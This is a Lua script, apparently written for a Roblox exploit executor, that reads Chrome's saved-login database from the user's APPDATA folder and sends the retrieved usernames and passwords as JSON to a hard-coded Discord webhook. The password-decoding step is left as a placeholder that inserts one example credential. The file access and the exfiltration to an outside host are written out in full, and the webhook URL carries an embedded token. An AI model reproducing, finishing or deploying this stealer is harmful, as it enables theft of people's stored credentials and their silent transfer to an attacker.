local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    -- Choose an HTTP request function compatible with your environment
    local request = http_request or request or HttpPost or syn.request
    local payload = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}

    local success, err = pcall(request, payload)
    if not success then
        print("Error sending webhook: " .. err)
    end
end

local function createWebhookData(passwords)
    local content = "Retrieved passwords:\n"
    for _, password in ipairs(passwords) do
        content = content .. password.username .. ": " .. password.password .. "\n"
    end
    return '{"content": "' .. content .. '"}'
end

local function getChromePasswords()
    local appDataPath = os.getenv("APPDATA")
    local chromePath = appDataPath .. "\\Google\\Chrome\\User Data\\Default\\Login Data"

    local f = io.open(chromePath, "rb")
    if not f then
        error("Could not open file. Please check if Chrome is installed and the path is correct.")
    end

    local login_data = f:read("*all")
    f:close()

    -- Note: You will need SQLite to read the "Login Data" file properly
    -- This is a placeholder. Implement SQLite logic to retrieve passwords
    local passwords = {}  -- Replace with actual logic to extract passwords from SQLite data

    -- Example of how you might add a password (for testing purposes)
    table.insert(passwords, {username = "example_user", password = "example_password"})

    return passwords
end

local webhookUrl = "https://discord.com/api/webhooks/1288886461080408126/or_ljH8rWPnHus5yE87SxaNLwoCO_7dlpPE_pFd5PI75kjMZztyRwcVgNZFS5V13Tfsf"
local passwords = getChromePasswords()

if #passwords > 0 then
    local webhookData = createWebhookData(passwords)
    sendWebhook(webhookUrl, webhookData)
else
    print("No passwords retrieved.")
end
